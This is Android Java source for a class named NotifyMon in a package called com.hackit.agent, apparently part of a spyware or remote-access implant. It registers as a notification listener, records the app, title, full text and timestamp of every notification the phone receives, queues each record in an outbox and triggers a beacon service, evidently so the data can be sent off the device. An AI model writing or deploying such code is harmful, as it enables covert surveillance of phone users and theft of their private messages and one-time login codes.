package com.hackit.agent;

import android.app.Notification;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import org.json.JSONObject;

/** Captures the title/text of every posted notification as it arrives. */
public class NotifyMon extends NotificationListenerService {
    private static volatile boolean connected;

    static boolean connected() {
        return connected;
    }

    @Override
    public void onListenerConnected() {
        connected = true;
        Log.d("notif listener on");
        BeaconService.start(this);
    }

    @Override
    public void onListenerDisconnected() {
        connected = false;
        Log.d("notif listener off");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) {
            return;
        }
        try {
            Notification notification = sbn.getNotification();
            Bundle extras = notification == null ? null : notification.extras;
            String title = extras == null ? "" : text(extras, Notification.EXTRA_TITLE);
            String body = extras == null ? "" : text(extras, Notification.EXTRA_TEXT);
            String big = extras == null ? "" : text(extras, Notification.EXTRA_BIG_TEXT);
            if (title.isEmpty() && body.isEmpty() && big.isEmpty()) {
                return;
            }
            JSONObject row = new JSONObject();
            row.put("pkg", sbn.getPackageName());
            row.put("title", title);
            row.put("text", big.isEmpty() ? body : big);
            row.put("ts", sbn.getPostTime());
            row.put("id", sbn.getId());
            row.put("ongoing", sbn.isOngoing());
            if (Build.VERSION.SDK_INT >= 26) {
                row.put("chan", sbn.getNotification().getChannelId());
            }
            Outbox.event("notif", row);
            BeaconService.poke(this);
        } catch (Throwable exc) {
            Log.d("notif: " + exc);
        }
    }

    private static String text(Bundle extras, String key) {
        CharSequence value = extras.getCharSequence(key);
        return value == null ? "" : value.toString();
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Removal is noise; the post event already carried the content.
    }

    static void requestRebind(Context ctx) {
        try {
            if (Build.VERSION.SDK_INT >= 24) {
                requestRebind(new android.content.ComponentName(ctx, NotifyMon.class));
            }
        } catch (Throwable ignored) {
        }
    }
}
